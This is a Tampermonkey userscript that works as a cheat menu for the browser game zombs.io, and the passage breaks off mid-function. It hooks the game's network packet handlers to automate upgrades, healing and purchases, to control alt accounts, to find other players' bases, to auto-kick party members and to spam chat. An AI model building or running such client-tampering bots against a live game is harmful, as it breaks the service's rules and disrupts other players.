// ==UserScript==
// @name         R
// @namespace    http://tampermonkey.net/
// @version      1
// @description  try to take over the world!
// @author       Shadow#1121
// @match        zombs.io
// @match        localhost
// @grant        none
// ==/UserScript==

document.getElementsByClassName('hud-intro-name')[0].setAttribute('maxlength', 29);
document.querySelectorAll('.ad-unit, .hud-intro-youtuber, .hud-intro-footer, .hud-intro-stone, .hud-intro-tree, hud-respawn-corner-bottom-left, .hud-intro-social, .hud-intro-more-games, .hud-intro-form > label, .hud-intro-stone, .hud-intro-tree, .hud-intro-corner-bottom-left, .hud-intro-corner-bottom-right').forEach(el => el.remove());
document.getElementsByClassName("hud-intro-play")[0].setAttribute("class", "btn btn-white hud-intro-play");
document.getElementsByClassName("hud-intro-wrapper")[0].childNodes[1].innerHTML = `<br style="height:20px;"><Custom><b><font size='24'>T</font></b></Custom>`;
document.getElementsByClassName("hud-intro-wrapper")[0].childNodes[3].innerHTML = `<font size='5'>By Shadow#1121</font><br><br><font size='3'>visuals by mahverski.</font>`;
document.getElementsByClassName('hud-party-tag')[0].setAttribute('maxlength', 49);
document.getElementsByClassName("hud-intro-form")[0].setAttribute("style", "width: 310px; height: 330px; margin-top: 8px; background-color: rgb(0, 0, 0, 0.0);");
document.getElementsByClassName("hud-intro-guide")[0].setAttribute("style", "width: 420px; height: 280px; margin-top: 8px; background-color: rgb(0, 0, 0, 0.0);");
document.getElementsByClassName("hud-intro-left")[0].setAttribute("style", "width: 360px; height: 280px; margin-top: 24px; margin-left: 80px; margin-right: 0px;");
document.getElementsByClassName('hud-chat')[0].style.width = "auto";
document.getElementsByClassName('hud-chat')[0].style.minWidth = "500px";
document.getElementsByClassName('hud-chat-input')[0].setAttribute('maxlength', 249);


let css = `
 .btn:hover {
     cursor: pointer;
}
 .btn-blue {
     background-color: #144b7a;
}
 .btn-blue:hover .btn-blue:active {
     background-color: #4fa7ee;
}
 .btn-white-display {
     background: #FFF0FF;
     color: #00000;
     line-height: inherit;
     padding: 1px;
     background-image: url(https://i.pinimg.com/564x/75/10/d1/7510d144335a2d2ed277c00df430f6a7.jpg);
     margin-right: 0px;
     margin-bottom: 10px;
     border: 3px solid white;
     height: 48px;
}
 .btn-white {
     background-image: url(https://papers.co/wallpaper/papers.co-md64-star-white-space-galaxy-35-3840x2160-4k-wallpaper.jpg);
     background-size: cover;
     color: #000000;
     line-height: inherit;
}
.btn-white:hover {
     color: #000000;
          background-image: url(https://papers.co/wallpaper/papers.co-md64-star-white-space-galaxy-35-3840x2160-4k-wallpaper.jpg);
     background-size: cover;
}
         .hud-menu-iframe h3 {
            display: block;
            margin: 0;
            line-height: 20px;
         }

         .hud-menu-iframe{
            display: none;
            position: fixed;
            border-radius: 4px;
            top: 45%;
            left: 50%;
            padding: 20px;
            width: 780px;
            height: 500px;
            transform: translate(-50%, -50%);
     background: rgba(0, 0, 0, 0.6);
     color: #eee;
     z-index: 20;
          background-image: url(https://images.wallpaperscraft.com/image/single/stars_space_dark_139528_1920x1080.jpg);
     background-size: cover;
         }

         .hud-menu-iframe .hud-iframe-grid {
            text-align: center;
            display: block;
            position: relative;
            height: 420px;
            margin: 20px 0 0;
            padding: 10px;
            background: rgba(0, 0, 0, 0.2);
            overflow-y: auto;
            border-radius: 3px;
         }
         .hud-menu-icons .hud-menu-icon[data-type=Iframe]::before {
            background-image: url("https://www.iconpacks.net/icons/2/free-settings-icon-3110-thumb.png");
            background-size: 30px;
         }
 .box {
     display: block;
     width: 100%;
     height: 50px;
     line-height: 34px;
     padding: 8px 14px;
     margin: 0 0 10px;
     background: #eee;
     border: 0;
     font-size: 14px;
     box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
     border-radius: 4px;
}
 .hud-intro::before {
     background-image: url(https://images.wallpaperscraft.com/image/single/stars_space_dark_139528_1920x1080.jpg);
     background-size: cover;
}
 .longbtn {
     display: block;
     width: 100%;
     height: 50px;
     line-height: 50px;
}
 .disabledBtn {
     opacity: 0.6;
     cursor: not-allowed;
     display: inline-block;
     height: 40px;
     line-height: 40px;
     padding: 0 20px;
     background: #444;
     color: #eee;
     border: 0;
     font-size: 14px;
     vertical-align: top;
     text-align: center;
     text-decoration: none;
     text-shadow: 0 1px 0 rgba(0, 0, 0, 0.4);
     box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
     border-radius: 4px;
     transition: all 0.15s ease-in-out;
}
 input {
     width: 25%;
}
 .btn1 {
     display: inline-block;
     height: 20px;
     line-height: 15px;
     padding: 0 20px;
     color: #eee;
    x border: 0;
     font-size: 10px;
     vertical-align: top;
     text-align: center;
     text-decoration: none;
     border-radius: 4px;
     transition: all 5s ease-in-out;
}
 .btn1:hover {
     cursor: pointer;
}
 .btn1-blue {
     background-color: #144b7a;
}
 .btn1-blue:hover .btn1-blue:active {
     background-color: #4fa7ee;
}
 a {
     text-decoration: none;
}
#hud-menu-shop {
   top: 45%;
   left: 50%;
   width: 690px;
   height: 450px;
   background-image: url(https://images.wallpaperscraft.com/image/single/stars_space_dark_139528_1920x1080.jpg);
   background-size: cover;
   margin: 0;
   transform: translate(-50%, -50%);
   padding: 20px 20px 20px 20px;
}
.hud-menu-shop .hud-shop-grid {
   height: 330px;
}
 .hud-menu-party .hud-party-tag {
     width: 120px;
}
 .hud-menu-party .hud-party-share {
     width: 280px;
}
 #hud-menu-party {
     top: 51%;
     width: 610px;
     height: 480px;
     background-color: rgb(61 115 157 / 55%);
     border: 5px solid white;
     background-image: url(https://images.wallpaperscraft.com/image/single/stars_space_dark_139528_1920x1080.jpg);
     background-size: cover;
}
 .hud-menu-party .hud-party-grid .hud-party-link.is-active {
     background: lightblue !important;
}
 .hud-menu-party .hud-party-visibility {
     margin: 0 0 0 10px;
     width: 125px;
}
 .hud-popup-overlay .hud-popup-confirmation .hud-confirmation-actions .btn.btn-green {
     background: #649db0;
}
 .hud-chat .hud-chat-message {
     white-space: unset;
     word-break: break-word;
}
 .hud-chat .hud-chat-messages {
     max-height: 340px;
     min-height: 35px;
}
 #hud-menu-settings {
     background-image: url(https://images.wallpaperscraft.com/image/single/stars_space_dark_139528_1920x1080.jpg);
     background-size: cover;
}
 .hud .box {
     display: block;
     width: 100%;
     height: 50px;
     line-height: 34px;
     padding: 8px 14px;
     margin: 0 0 10px;
     background: #eee;
     border: 0;
     font-size: 14px;
     box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
     border-radius: 4px;
}
 .codeIn, .joinOut {
     height: 50px;
}
 .hud-menu-raid {
     display: none;
     position: absolute;
     top: 41%;
     left: 50%;
     width: 860px;
     height: 760px;
     margin: -300px 0 0 -410px;
     padding: 20px;
     background: rgba(0, 0, 0, 0.6);
     background-image: url(https://images.wallpaperscraft.com/image/single/stars_space_dark_139528_1920x1080.jpg);
     background-size: cover;
     color: #eee;
     border: 2px solid black;
     border-radius: 2px;
     z-index: 15;
     box-shadow: 0 7px 15px #eee;
     overflow: hidden;
}
 .hud-menu-raid h3 {
     display: block;
     margin: 0px;
     color: #FFF;
     line-height: 20px;
}
 .hud-menu-raid .hud-raid-grid {
     display: block;
     height: 540px;
     padding: 5px;
     margin-top: 9px;
}
 .hud-spell-icons .hud-spell-icon[data-type="Raid"]::before {
     background-image: url("https://zombs.io/asset/image/ui/inventory/inventory-spear-t7.svg");
}
 .hud-menu-raid .hud-the-tab {
     position: relative;
     height: 60px;
     line-height: 40px;
     margin: 20px;
     border: rgba(0, 0, 0, 0.6);
}
 .hud-menu-raid .hud-the-tab {
     display: block;
     float: left;
     padding: 0 14px;
     margin: 0 1px 0 0;
     font-size: 14px;
     background: rgba(0, 0, 0, 0.6);
     color: rgba(255, 255, 255, 0.4);
     transition: all 0.15s ease-in-out;
}
 .hud-menu-raid .hud-the-tab:hover {
     background: rgba(0, 0, 0, 0.2);
     color: #eee;
     cursor: pointer;
}
`;

let styles = document.createElement("style");
styles.appendChild(document.createTextNode(css));
document.head.appendChild(styles);
styles.type = "text/css";

// spell icon
let spell = document.createElement("div");
spell.classList.add("hud-spell-icon");
spell.setAttribute("data-type", "Raid");
spell.classList.add("hud-raid-icon");
document.getElementsByClassName("hud-spell-icons")[0].appendChild(spell);

//Menu for spell icon
let modHTML = `
<div class="hud-raid">
<div class="hud-menu-raid">
<div style="text-align:center" class="hud-raid-menus"><br>

<button class="btn btn-white SE" style="width: 15%; height: 38px;">Main</button>

<button class="btn btn-white AB" style="width: 15%; height: 38px;">Alts</button>

<button class="btn btn-white AJ" style="width: 15%; height: 38px;">Alts (2)</button>

<button class="btn btn-white AE" style="width: 15%; height: 38px;">Alts (3)</button>

<button class="btn btn-white BS" style="width: 15%; height: 38px;">Bases</button>

<button class="btn btn-white AX" style="width: 15%; height: 38px;">Other</button>

</div>
<div class="hud-raid-grid">
</div>
`;
document.body.insertAdjacentHTML("afterbegin", modHTML);
let raidMenu = document.getElementsByClassName("hud-menu-raid")[0];

document.getElementsByClassName("hud-raid-icon")[0].addEventListener("click", function () {
    if (raidMenu.style.display == "none" || raidMenu.style.display == "") {
        raidMenu.style.display = "block";
    } else {
        raidMenu.style.display = "none";
    };
});

window.addEventListener("keydown", e => {
    switch (e.keyCode) {
        case 45:
            document.getElementsByClassName("hud-raid-icon")[0].click();
    };
});

let _menu = document.getElementsByClassName("hud-menu-icon");
let _spell = document.getElementsByClassName("hud-spell-icon");

let allIcon = [
    _menu[0],
    _menu[1],
    _menu[2],
    _spell[0],
    _spell[1]
];

allIcon.forEach(function (elem) {
    elem.addEventListener("click", function () {
        if (raidMenu.style.display == "block") {
            raidMenu.style.display = "none";
        };
    });
});

document.getElementsByClassName("SE")[0].addEventListener("click", function () {
    displayAllToNone();

    document.getElementsByClassName("SE")[0].innerText = "- - -";
    document.getElementsByClassName("etc.Class")[0].innerText = "Main";

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i")[0]) {
            document.getElementsByClassName(i + "i")[0].style.display = "";
        };
    };
});

document.getElementsByClassName("AB")[0].addEventListener("click", function () {
    displayAllToNone();

    document.getElementsByClassName("AB")[0].innerText = "- - -";
    document.getElementsByClassName("etc.Class")[0].innerText = "Alts";

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i2")[0]) {
            document.getElementsByClassName(i + "i2")[0].style.display = "";
        };
    };
});

document.getElementsByClassName("AJ")[0].addEventListener("click", function () {
    displayAllToNone();

    document.getElementsByClassName("AJ")[0].innerText = "- - -";
    document.getElementsByClassName("etc.Class")[0].innerText = "Alts (2)";

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i1")[0]) {
            document.getElementsByClassName(i + "i1")[0].style.display = "";
        };
    };
});

document.getElementsByClassName("AE")[0].addEventListener("click", function () {
    displayAllToNone();

    document.getElementsByClassName("AE")[0].innerText = "- - -";
    document.getElementsByClassName("etc.Class")[0].innerText = "Alts (3)";

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i5")[0]) {
            document.getElementsByClassName(i + "i5")[0].style.display = "";
        };
    };
});

document.getElementsByClassName("BS")[0].addEventListener("click", function () {
    displayAllToNone();

    document.getElementsByClassName("BS")[0].innerText = "- - -";
    document.getElementsByClassName("etc.Class")[0].innerText = "Bases";

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i3")[0]) {
            document.getElementsByClassName(i + "i3")[0].style.display = "";
        };
    };
});

document.getElementsByClassName("AX")[0].addEventListener("click", function () {
    displayAllToNone();

    document.getElementsByClassName("AX")[0].innerText = "- - -";
    document.getElementsByClassName("etc.Class")[0].innerText = "Other";

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i6")[0]) {
            document.getElementsByClassName(i + "i6")[0].style.display = "";
        };
    };
});

// key to open and close
function modm() {
    if (raidMenu.style.display == "none" || raidMenu.style.display == "") {
        raidMenu.style.display = "block";
    } else {
        raidMenu.style.display = "none";
    };
};

function displayAllToNone() {
    document.getElementsByClassName("SE")[0].innerText = "Main";
    document.getElementsByClassName("AB")[0].innerText = "Alts";
    document.getElementsByClassName("AJ")[0].innerText = "Alts (2)";
    document.getElementsByClassName("AE")[0].innerText = "Alts (3)";
    document.getElementsByClassName("BS")[0].innerText = "Bases";
    document.getElementsByClassName("AX")[0].innerText = "Other";

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i")[0]) {
            document.getElementsByClassName(i + "i")[0].style.display = "none";
        };
    };

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i2")[0]) {
            document.getElementsByClassName(i + "i2")[0].style.display = "none";
        };
    };

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i3")[0]) {
            document.getElementsByClassName(i + "i3")[0].style.display = "none";
        };
    };

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i1")[0]) {
            document.getElementsByClassName(i + "i1")[0].style.display = "none";
        };
    };

    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i5")[0]) {
            document.getElementsByClassName(i + "i5")[0].style.display = "none";
        };
    };
    for (let i = 0; i < 50; i++) {
        if (document.getElementsByClassName(i + "i6")[0]) {
            document.getElementsByClassName(i + "i6")[0].style.display = "none";
        };
    };
};


document.getElementsByClassName("hud-raid-grid")[0].innerHTML = `
<div style="text-align:center">
<hr>
<h3 class="etc.Class">Raid</h3>
<hr>
<br>
<button class="btn btn-white 1i" style="width: 42%;">Sell All!</button>

<button class="btn btn-white 2i" style="width: 42%;">Sell Walls!</button>

<button class="btn btn-white 3i" style="width: 42%; margin-top: 6px;">Sell Doors!</button>

<button class="btn btn-white 4i" style="width: 42%; margin-top: 6px;">Sell Traps!</button>

<button class="btn btn-white 5i" style="width: 42%; margin-top: 6px;">Sell Arrows!</button>

<button class="btn btn-white 6i" style="width: 42%; margin-top: 6px;">Sell Mages!</button>

<button class="btn btn-white 7i" style="width: 42%; margin-top: 6px;">Sell Pets!</button>

<button class="btn btn-white 8i" style="width: 42%; margin-top: 6px;">Activate Upgrade All!</button>

<button class="btn btn-white 9i" style="width: 42%; margin-top: 6px;">Activate AHRC!</button>

<button class="btn btn-white 10i" style="width: 42%; margin-top: 6px;">Enable Auto hi!</button>

<button class="btn btn-white 11i" style="width: 42%; margin-top: 6px;">!Auto heal and Pet Heal</button>

<button class="btn btn-white 12i" style="width: 42%; margin-top: 6px;">!Revive and Evolve Pets</button>

<button class="btn btn-white 13i" style="width: 42%; margin-top: 6px;">Enable Auto Kicker</button>

<button class="btn btn-white 14i" style="width: 42%; margin-top: 6px;">Clear Messages!</button>

<button class="btn btn-white 15i" style="width: 42%; margin-top: 6px;">Enable 3x3!</button>

<button class="btn btn-white 16i" style="width: 42%; margin-top: 6px;">Enable 5x5!</button>

<button class="btn btn-white 17i" style="width: 42%; margin-top: 6px;">Enable 7x7!</button>

<button class="btn btn-white 18i" style="width: 42%; margin-top: 6px;">Enable Auto Respawn!</button>

<button class="btn btn-white 19i" style="width: 42%; margin-top: 6px;">Enable Auto Kicker!</button>

<button class="btn btn-white 0i2" style="display: none;">Send Alt!</button>

<button class="btn btn-white 28i2" style="display: none;">Send FB Alt!</button>

<button class="btn btn-white 1i2" style="display: none;">Enable Aim!</button>

<button class="btn btn-white 10i2 emm" style="display: none;">Enable Mousemove!</button>

<br class="49i2"><br class="48i2">

<button class="btn btn-white 3i2" style="display: none;">Delete Alt!</button>

<input type="number" class="btn btn-white 4i2" placeholder="WebSocket id" style="display: none;">

<button class="btn btn-white 7i2" style="display: none;">Delete All Alts!</button>

<button class="btn btn-white 19i2">Enable Auto Refiller</button>

<br class="47i2"><br class="46i2">

<button class="btn btn-white 8i2" style="display: none;">Show Resources!</button>

<button class="btn btn-white 30i2" style="display: none;">Lock Pos</button>

<button class="btn btn-white 21i2" style="display: none;">Control Alts!</button>

<button class="btn btn-white 29i2" style="display: none;">Enable Chat Spam</button>

<select class='btn btn-white 27i2'>
    <option class="btn btn-white">Regular</option>
    <option class="btn btn-white">Disconnect</option>
</select>


<br class="45i2"><br class="44i2">

<button class="btn btn-white 13i2" style="display: none;">Enable Autobomb!</button>

<button class="btn btn-white 11i2" style="display: none;">Start Aito!</button>

<button class="btn btn-white 12i2" style="display: none;">Activate Base Finder!</button>

<button class="btn btn-white 17i2" style="display: none;">Clear Base Objects</button>

<br class="43i2"><br class="42i2">

<input type="text" value="1" class="btn btn-white 16i2" placeholder="Player Rank" style="display: none; width: 25%;">

<button class="btn btn-white 18i2" style="display: none;">Activate Player Finder</button>

<button class="btn btn-white 25i2" style="display: none;">Follow Position</button>

<button class="btn btn-white 0i1" style="display: none;">Heal Spell</button>

<button class="btn btn-white 1i1" style="display: none;">Timeout</button>

<button class="btn btn-white 2i1" style="display: none;">1b1 Mouse</button>

<button class="btn btn-white 3i1" style="display: none;">1b1 Stash</button>

<button class="btn btn-white 17i1" style="display: none;">Sell Pets</button>

<br class="49i1"><br class="48i1">

<button class="btn btn-white 10i1" style="display: none;">Pickaxe</button>

<button class="btn btn-white 11i1" style="display: none;">Spear</button>

<button class="btn btn-white 12i1" style="display: none;">Bow</button>

<button class="btn btn-white 13i1" style="display: none;">Bomb</button>

<button class="btn btn-white 14i1" style="display: none;">Shield</button>

<button class="btn btn-white 15i1" style="display: none;">Carl</button>

<button class="btn btn-white 16i1" style="display: none;">Woody</button>

<br class="47i1"><br class="46i1">

<button class="btn btn-white 4i1" style="display: none;">Join alt</button>

<button class="btn btn-white 5i1" style="display: none;">Alts join</button>

<button class="btn btn-white 6i1" style="display: none;">Alts Leave</button>

<br class="45i1"><br class="44i1">

<input class="btn btn-white 18i1" type='String' placeholder='Alt PSK'></input>

<input class="btn btn-white 8i1" type='Number' placeholder='Alt id'></input>

<br class="43i1"><br class="42i1">

<button class="btn btn-white 19i1">Join alt</button>

<button class="btn btn-white 7i1">Alt join</button>

<button class="btn btn-white 9i1">Alt Leave</button>

<button class="btn btn-white 0i5">Set party names</button>

<input class="btn btn-white 1i5" type='String' placeholder='Party name'></input>

<button class="btn btn-white 2i5">Open parties</button>

<button class="btn btn-white 3i5">Close parties</button>

<button class="btn btn-white 0i3" onclick="RecordBase();" style="display: none;">Record Base!</button>

<button class="btn btn-white 1i3" onclick="buildRecordedBase();" style="display: none;">Build Recorded Base!</button>

<button class="btn btn-white 2i3" onclick="DeleteRecordedbase();" style="display: none;">Delete Recorded Base!</button>

<br class="49i3"><br class="48i3">

<button class="btn btn-white 5i3" onclick="RecordBase2();" style="display: none;">Record Base (2)!</button>

<button class="btn btn-white 6i3" onclick="buildRecordedBase2();" style="display: none;">Build Recorded Base (2)!</button>

<button class="btn btn-white 7i3" onclick="DeleteRecordedbase2();" style="display: none;">Delete Recorded Base (2)!</button>

<br class="47i3"><br class="46i3">

<button class="btn btn-white 10i3" onclick="RecordBase3();" style="display: none;">Record Base (3)!</button>

<button class="btn btn-white 11i3" onclick="buildRecordedBase3();" style="display: none;">Build Recorded Base (3)!</button>

<button class="btn btn-white 12i3" onclick="DeleteRecordedbase3();" style="display: none;">Delete Recorded Base (3)!</button>

<br class="45i3"><br class="44i3">

<button class="btn btn-white 13i3" onclick="RecordBase4();" style="display: none;">Record Base (4)!</button>

<button class="btn btn-white 14i3" onclick="buildRecordedBase4();" style="display: none;">Build Recorded Base (4)!</button>

<button class="btn btn-white 15i3" onclick="DeleteRecordedbase4();" style="display: none;">Delete Recorded Base (4)!</button>

<br class="43i3"><br class="42i3">

<button class="btn btn-white 16i3" onclick="saveBase();" style="display: none;">Save Towers!</button>

<button class="btn btn-white 17i3" onclick="buildSavedBase();" style="display: none;">Build Saved Towers!</button>

<br class="42i3"><br class="41i3">

<button class="btn btn-white 21i3" onclick="window.rebuilderToggle();" style="display: none;">Enable Auto-Rebuilder!</button>

<button class="btn btn-white 26i3" onclick="upgradealltoggle();" style="display: none;">Enable Upgrade All!</button>

<br class="40i3"><br class="39i3">

<input type="text" class="btn btn-white 30i3" placeholder='Click "Save Towers!" and build your favorite base to get their codes.' style="width: 100%; display: none;" disabled="true">

<button class="btn btn-white 30i6">Hide Ground</button>

<button class="btn btn-white 31i6">Hide Projectiles</button>

<br class="64i6"><br class="53i6">

<button class="btn btn-white 32i6">Hide Npcs</button>

<button class="btn btn-white 33i6">Hide Environment</button>

<br class="68i6"><br class="56i6">

<button class="btn btn-white 34i6">Hide Scene</button>

<button class="btn btn-white 35i6">Stop Game</button>

<button class="btn btn-white 42i6">Hide Chat</button>

<br class="69i6"><br class="59i6">

<button class="btn btn-white 36i6">Enable Exact Rss Counter</button>
<button class="btn btn-white 37i6">Enable Auto Buy Spear</button>
<br class="70i6"><br class="60i6">
<button class="btn btn-white 38i6">Enable Auto Buy Pickaxe</button>
<button class="btn btn-white 39i6">Enable Auto Buy Bomb</button>
<br class="71i6"><br class="61i6">
<button class="btn btn-white 40i6"">Enable Auto Buy Bow</button>
<button class="btn btn-white 41i6">Enable Auto Buy Shield</button>
`;

displayAllToNone();
let score = 0;
let oldWave = 0;
let logs = 0;
document.getElementsByClassName('hud-settings-grid')[0].innerHTML = "";
let altName;

game.network.sendInput = (e) => {
    let i = e;
    if (!i.mouseDown && !i.mouseUp) {
        game.network.sendPacket(3, e);
    };
};

document.getElementsByClassName('hud')[0].addEventListener('mousedown', e => {
    if (!e.button) {
        game.network.sendPacket(3, { mouseDown: game.inputPacketCreator.screenToYaw(e.clientX, e.clientY) });
    };
});

document.getElementsByClassName('hud')[0].addEventListener('mouseup', e => {
    if (!e.button) {
        game.network.sendPacket(3, { mouseUp: 1 });
    };
});

let upgradeAll = false;
let AHRC = false;
let accept = false;
let kick = false;
let heal = true;
let revive = true;
let clearMsgs = false;
let respawnToggle = false;
let autobuild = false;
let petTimeout = false;
let myPlayer;
let myPet;
let petUidToSell = 0;
let getRss = false;
let shouldHealPet;
let autohi;
let altrss;
let uid;
let x3toggle;
let x5toggle;
let x7toggle;
let allowed1 = true;
let rb = false;
let entities = {};
let players = {};
let buildings = {};
let spamMessage;
let msg;

let count = 0;

var Bowtier = 0;

let packets = {
    0: "PACKET_ENTITY_UPDATE",
    1: "PACKET_PLAYER_COUNTER_UPDATE",
    2: "PACKET_SET_WORLD_DIMENSIONS",
    3: "PACKET_INPUT",
    4: "PACKET_ENTER_WORLD",
    7: "PACKET_PING",
    9: "PACKET_RPC",
    PACKET_ENTER_WORLD: 4,
    PACKET_ENTITY_UPDATE: 0,
    PACKET_INPUT: 3,
    PACKET_PING: 7,
    PACKET_PLAYER_COUNTER_UPDATE: 1,
    PACKET_RPC: 9,
    PACKET_SET_WORLD_DIMENSIONS: 2
};

document.addEventListener('keyup', function (e) {
    if (e.key === "Enter" && game.ui.playerTick.dead === 1) {
        game.ui.components.Chat.startTyping();
    };
});

function msToTime(s) {
    function pad(n, z) {
        z = z || 2;
        return ('00' + n).slice(-z);
    }

    var ms = s % 1000;
    s = (s - ms) / 1000;
    var secs = s % 60;
    s = (s - secs) / 60;
    var mins = s % 60;
    var hrs = (s - mins) / 60;

    return pad(hrs) + ':' + pad(mins) + ':' + pad(secs) + '.' + pad(ms, 3);
}

game.network.addPacketHandler = function (event, callback) {
    game.network.emitter.on(packets[event], callback);
};

game.network.emitter.removeListener('PACKET_ENTITY_UPDATE', game.network.emitter._events.PACKET_ENTITY_UPDATE);

game.network.addPacketHandler(0, function (e) {
    game.network.sendRpc({ "name": "BuyItem", "itemName": "HealthPotion", "tier": 1 })
})
for (let i = 0; i < 10; i++) {
    game.network.addPacketHandler(i, function (e) {
        msg = e;
        interval();
    });
};

let interval = () => {
    if (msg.uid) {
        uid = msg.uid;
        players = {};
        entities = {};
        buildings = {};
        window.message = 0;
    }
    if (msg.entities) {
        if (window.message == 0) {
            game.world.replicator.onEntityUpdate(msg);
        }
        if (msg.entities[uid].name) {
            myPlayer = msg.entities[uid];
        };
        for (let g in myPlayer) {
            if (myPlayer[g] !== msg.entities[uid][g] && msg.entities[uid][g] !== undefined) {
                myPlayer[g] = msg.entities[uid][g];
            };
        };
        if (myPlayer.petUid) {
            if (msg.entities[myPlayer.petUid]) {
                if (msg.entities[myPlayer.petUid].model) {
                    myPet = msg.entities[myPlayer.petUid];
                    shouldHealPet = false;
                };
            };
            for (let g in myPet) {
                if (msg.entities[myPlayer.petUid]) {
                    if (myPet[g] !== msg.entities[myPlayer.petUid][g] && msg.entities[myPlayer.petUid][g] !== undefined) {
                        myPet[g] = msg.entities[myPlayer.petUid][g]
                        petUidToSell = msg.entities[myPlayer.petUid].uid;
                    };
                };
            };
        };
        for (let i in msg.entities) {
            if (msg.entities[i].name) {
                players[i] = msg.entities[i];
                if (autohi) {
                    game.ui.components.Chat.onMessageReceived({ displayName: "Nearby player found.", message: `${msg.entities[i].name}` });
                };
            };
        };
        for (let i in players) {
            if (!msg.entities[i]) {
                delete players[i];
            };
            for (let g in players[i]) {
                if (players[i][g] !== msg.entities[i][g] && msg.entities[i][g] !== undefined) {
                    players[i][g] = msg.entities[i][g];
                };
            };
        };
    };
    if (msg.name == 'Leaderboard') {
        let e = msg.response;
        for (let i in e) {
            if ((e[i].wave - 1) !== -1 && e[i].uid == game.world.myUid) {
                if (e[i].wave !== oldWave) {
                    logs = logs + 1;
                    oldWave = e[i].wave;
                    score = e[i].score;
                    document.getElementsByClassName('hud-settings-grid')[0].innerHTML += `
<hr><h3><div class="score${logs}">{wave: ${e[i].wave}, scoreGained: ${0}, totalScore: ${score}};</div></h3><hr>`
                } else {
                    document.getElementsByClassName(`score${logs}`)[0].innerText = `{wave: ${e[i].wave}, scoreGained: ${e[i].score - score}, totalScore: ${e[i].score}};`;
                }
            }
        }
    }
    if (game.world.inWorld) {
        let entities = game.world.entities;
        if (upgradeAll) {
            if (!window.upgradeAll1) {
                window.upgradeAll1 = true;
                setTimeout(() => {
                    window.upgradeAll1 = false;
                }, 100);
                for (let uid in entities) {
                    if (entities[uid].fromTick.tier !== 8 || entities[uid].fromTick.tier !== GetGoldStash().uid) {
                        game.network.sendPacket(9, { name: "UpgradeBuilding", uid: game.world.entities[uid].fromTick.uid });
                    };
                };
            };
        };
        if (AHRC) {
            if (!window.AHRC1) {
                window.AHRC1 = true;
                setTimeout(() => {
                    window.AHRC1 = false;
                }, 75);
                for (let uid in entities) {
                    if (!entities.hasOwnProperty(uid)) continue;
                    let obj = entities[uid];
                    game.network.sendPacket(9, { name: "CollectHarvester", uid: obj.fromTick.uid });
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 1) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.07 });
                    }
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 2) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.11 });
                    }
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 3) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.17 });
                    }
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 4) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.22 });
                    }
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 5) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.25 });
                    }
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 6) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.28 });
                    }
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 7) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.42 });
                    }
                    if (obj.fromTick.model == "Harvester" && obj.fromTick.tier == 8) {
                        game.network.sendPacket(9, { name: "AddDepositToHarvester", uid: obj.fromTick.uid, deposit: 0.65 });
                    }
                    game.network.sendPacket(9, { name: "CollectHarvester", uid: obj.fromTick.uid });
                };
            };
        };
        if (accept) {
            for (let i2 = 0; i2 < document.getElementsByClassName("btn btn-green hud-confirmation-accept").length; i2++) {
                document.getElementsByClassName("btn btn-green hud-confirmation-accept")[i2].click();
            };
        };
        if (kick) {
            if (game.ui.playerPartyMembers.length > 1) {
                game.network.sendPacket(9, { name: "KickParty", uid: game.ui.playerPartyMembers[1].playerUid });
            };
        };
        if (revive) {
            if (!window.reviver) {
                window.reviver = true;
                setTimeout(() => {
                    window.reviver = false;
                }, 10000);
                let element1 = document.getElementsByClassName("hud-shop-actions-revive");
                for (let i = 0; i < element1.length; i++) {
                    element1[i].click();
                };
                let element2 = document.getElementsByClassName("hud-shop-actions-evolve");
                for (let i = 0; i < element2.length; i++) {
                    element2[i].click();
                };
            };
        };
        if (clearMsgs) {
            for (let i = 0; i < document.getElementsByClassName('hud-chat-message').length; i++) {
                document.getElementsByClassName('hud-chat-message')[i].remove();
            };
        };
        if (respawnToggle && game.ui.playerTick.dead === 1) {
            document.getElementsByClassName("hud-respawn-btn")[0].click();
        };
        if (heal) {
            if (myPlayer) {
                let playerHealth = (myPlayer.health / myPlayer.maxHealth) * 100;
                if (playerHealth <= 20) {
                    if (!window.playerTimeout_1) {
                        window.playerTimeout_1 = true;
                        setTimeout(() => {
                            window.playerTimeout_1 = false;
                        }, 300);
                        healPlayer();
                    };
                };
            };
        };
        if (heal) {
            if (myPet) {
                let petHealth = (myPet.health / myPet.maxHealth) * 100;
                if (petHealth <= 70) {
                    if (!petTimeout) {
                        petTimeout = true;
                        setTimeout(() => {
                            petTimeout = false;
                        }, 300);
                        game.network.sendPacket(9, { "name": "BuyItem", "itemName": "PetHealthPotion", "tier": 1 });
                        game.network.sendPacket(9, { "name": "EquipItem", "itemName": "PetHealthPotion", "tier": 1 });
                    };
                };
            };
